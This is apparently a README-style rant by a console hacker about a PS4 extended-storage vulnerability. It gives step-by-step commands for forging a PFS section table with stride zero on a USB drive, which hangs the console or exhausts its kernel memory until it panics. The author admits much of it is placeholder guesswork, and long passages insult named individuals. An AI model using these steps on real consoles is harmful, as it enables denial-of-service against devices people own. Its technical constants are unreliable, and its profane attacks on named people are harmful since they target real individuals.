# fuck you.

To everyone who called it bullshit before reading a single byte. To everyone who wrote "skid" in a Discord and went back to their game. To everyone who watched the repo land and said nothing, then privately asked someone else whether it was real. To the four or five named in the receipts section, and to the dozens unnamed who did the same thing in smaller rooms. This is for you. Read it or don't. The drive is on the desk either way.

You doubted the format before it was published. Then it was published, and you doubted the offsets. Then the offsets were confirmed against two drives, and you doubted the mechanism. Then the mechanism was falsified *by the person who proposed it*, in public, in writing, and you *still* didn't retract. That's not skepticism. That's a posture. Skepticism updates. You don't. You haven't. You won't.

Here is the honest state of the work, written for the record, because the record is the only thing that outlives this conversation.

## This is rushed, mostly because sony is hunting me lmfao

I'll say it before anyone else does, because I know it and I'd rather be the one to admit it. The tool is one iteration old. The README was written in a night. `pfs_forge.py` has a section-table forger whose entry layout is a *guess* extrapolated from a decompile that I got wrong the first time and corrected in public. The `ENTRY_SIZE=0x38` is a number I picked because the fields I could see fit in it, not because I confirmed it against a real PS4-written table. The `--table-off` default assumes a partition at LBA 2048 because that's what most USB drives use, not because I verified it on the target. Half the constants are placeholders. The other half are placeholders with comments that say they're placeholders.

I'm shipping it anyway. Not because it's finished — it isn't — but because it's *runnable*, and the only way any of this gets finished is if it's in people's hands where they can break it. Every person who runs `--scan` and pastes the output either confirms the layout or refutes it. Both are progress.

## Here is how to run it.

Two tools. Two commands each. No build step, no dependencies beyond Python 3.10 and elevation.

### `fahrenheit.py` — the record tool

Read the metadata record from a PS4-formatted drive. No writes.

```powershell
python fahrenheit.py --list
python fahrenheit.py --diagnose --disk 1
```

The first enumerates physical disks. The second reads `0x6000` through `0x6080` and prints the label, version, `len_a`, `len_b`, and the first 128 bytes of the body. It does not write anything. If it prints `label: NOT FOUND in first 64 KB`, your drive has no record.

Merge without writing:

```powershell
python fahrenheit.py --payload payload.bin --base jm_real.bin --no-write
```

Produces `merged_poc.bin`. Open it in HxD next to `jm_real.bin`. Only `len_a`, `len_b`, and the body should differ.

Write:

```powershell
python fahrenheit.py --payload payload.bin --base jm_real.bin --disk 1 --force
```

`--force` is mandatory. Saves the MBR, dismounts, writes, restores MBR, verifies. Do not run this on a drive you care about.

### `pfs_forge.py` — the section-table forger

Read-only scan:

```powershell
python pfs_forge.py --scan --disk 1 --scan-end 0x200000
```

Looks for pairs of consecutive entries with plausible `id`, `name_len`, `stride`, plus a string-search for `blk_bitmap`. If it prints candidate offsets, those are candidates. **Multiple candidates is normal.** The right offset is the one that looks like a real table when you merge with `--no-write --mode loop` and inspect in HxD. Run the merge against each candidate, look at the bytes at the candidate offset, and pick the one that produces the `id/flags/name_len/stride/name` layout below. Nothing gets written by `--scan` or by `--no-write`.

Merge a loop-mode table without writing:

```powershell
python pfs_forge.py --mode loop --table-off 0x100000 --no-write
```

You want to see at `--table-off`:

```
00 00 00 00 02 00 00 00     <- id = 2
00 00 00 00                 <- flags = 0
0b 00 00 00                 <- name_len = 11
00 00 00 00                 <- stride = 0   <- the bug
62 6c 6b 5f 62 69 74 6d 61 70  <- "blk_bitmap"
```

Write it:

```powershell
python pfs_forge.py --mode loop --table-off 0x100000 --disk 1 --force
```

Eject cleanly. Insert. Tap "Use This Extended Storage." Watch the LED. If it goes solid and the console stops responding, bug A fired. Power-cycle to recover. That is the PoC.

Memory-drain variant:

```powershell
python pfs_forge.py --mode leak --table-off 0x100000 --disk 1 --force
```

Same `stride=0`, but `name_len=0` makes the `strncmp` return zero immediately, the `blk_bitmap` branch fires every iteration, and each cycle leaks **at least 0x200 bytes, plus whatever buffer cache allocation the read pulls in — likely 0x2000 to 0x10000 per iteration.** The console runs out of kernel memory and reboots with a panic.

If `--scan` finds nothing, the table is encrypted and none of this reaches the walker.

## What has been established.

The metadata record format at `0x6000` is real. Captured from a PS4-formatted drive. Label, version, `len_a`, `len_b`, body offset — all observed. Offsets match across two drives.

The capacity-spoof hypothesis is falsified. The values in the record do not control the PS4's Extended Storage display, do not bypass the 250 GB minimum, do not change anything the console reads. Tested twice. SCSI `READ CAPACITY` is the source, and it comes from the USB bridge firmware. Not in dispute.

Bug B of the PFS walker does not exist. I claimed it did. I was wrong. The comparison helper stops on null in the constant argument, not the attacker-controlled one, and the constant is 11 bytes. Maximum overread is zero. Retracted.

Bug A of the PFS walker is real. `pfs_mount` reads block 0 of the partition, walks a section table with a stride field at entry offset `0x0C`. If that field is zero and the entry's `id` is nonzero, the walker never advances. Not in dispute.

The payload path is unverified. Whether the walker's stuck loop is reachable depends on the section table being plaintext at a known offset. That is exactly what `--scan` is for.

The exploit chain is not complete. This is not a jailbreak. It has never been called one by anyone who read the code.

## To the specific people.

To Yenyen: you called it nonsense before the first byte was public, then said nothing when the byte turned out to be real.  Fuck you.

To 0xMansoor: someone asked you for a kernel value. You called them a skid. The value is in a public dump. Fuck you.

To Saudidos: same pattern. A question treated as an admission. Fuck you.

To Genzfandz: called me a fraud "fraud" on X, no evidence. Fuck you.

To the deft one: you invented "belshit" and the name circulated. Fuck you.

## Sign-off.

The work is rushed. The tool is one iteration old. Half the constants are placeholders. The retractions are public, and there are two of them, and they were made by me, in writing, the moment I found out I was wrong. That is the standard I'm holding myself to.

The record is at `0x6000`. The walker bug is in `FUN_00ea1480`. The tool is on disk.

Run the command or get out of the way. Silence is not.

— bel · [jb.0d01.wtf](https://jb.0d01.wtf) · [@belsploit](https://x.com/belsploit)
